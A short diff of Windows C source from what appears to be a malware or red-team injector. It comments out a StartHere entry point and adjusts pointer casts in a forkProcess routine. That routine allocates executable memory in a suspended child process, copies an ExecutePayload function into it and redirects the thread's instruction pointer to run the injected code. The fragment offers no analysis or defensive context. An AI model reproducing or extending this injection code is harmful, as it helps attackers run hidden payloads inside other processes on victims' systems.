@@ -126,11 +126,11 @@ VOID ExecutePayload(VOID);
 VOID forkProcess(VOID);
 VOID StartHere(VOID);
 
-VOID StartHere(VOID)
-{
-	forkProcess();
-	ExecutePayload();
-}
+//VOID StartHere(VOID)
+//{
+//	forkProcess();
+//	ExecutePayload();
+//}
 
 VOID ExecutePayload(VOID)
 {
@@ -265,16 +265,16 @@ VOID forkProcess(VOID)
 	// Set EIP to new shellcode location
 	ctx.Rip = (DWORD64)memBaseAddress;
 #else
-	ctx.Esp -= sizeof(unsigned int);
+	ctx.Esp -= sizeof(DWORD);
 
 	// Write current EIP to the stack
-	MyWriteProcessMemory(ProcessInformation.hProcess, (LPVOID)ctx.Esp, (LPCVOID)ctx.Eip, sizeof(unsigned int), NULL);
+	MyWriteProcessMemory(ProcessInformation.hProcess, (LPVOID)ctx.Esp, (LPCVOID)ctx.Eip, sizeof(DWORD), NULL);
 
 	// Allocate memory in the new process
-	memBaseAddress = MyVirtualAllocEx(ProcessInformation.hProcess, 0, (int)forkProcess - (int)ExecutePayload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memBaseAddress = MyVirtualAllocEx(ProcessInformation.hProcess, 0, (DWORD)forkProcess - (DWORD)ExecutePayload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	// Write ExploitFunction to suspended process
-	MyWriteProcessMemory(ProcessInformation.hProcess, memBaseAddress, (LPCVOID)ExecutePayload, (int)forkProcess - (int)ExecutePayload, 0);
+	MyWriteProcessMemory(ProcessInformation.hProcess, memBaseAddress, (LPCVOID)ExecutePayload, (DWORD)forkProcess - (DWORD)ExecutePayload, 0);
 
 	// Setup CONTEXT
 	ctx.ContextFlags = CONTEXT_FULL;
